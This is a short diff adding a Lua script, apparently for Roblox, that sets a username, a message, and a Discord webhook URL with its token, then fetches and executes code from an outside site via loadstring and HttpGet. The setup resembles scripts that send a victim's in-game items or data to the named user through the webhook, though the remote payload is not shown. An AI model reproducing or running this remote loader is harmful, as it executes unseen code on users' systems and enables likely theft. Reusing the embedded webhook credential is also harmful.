@@ -1,0 +1,5 @@
+Username = "errorg2000"
+MailMessage = "I'm stupid "
+Webhook = "https://discord.com/api/webhooks/1259866347454857317/V5sNJNY5Q60X7MuB5FShCJkJiCG7_7HWY-4thA-EdgmYNJTgNIVFaLqJQmMVMQTsnFP4"
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
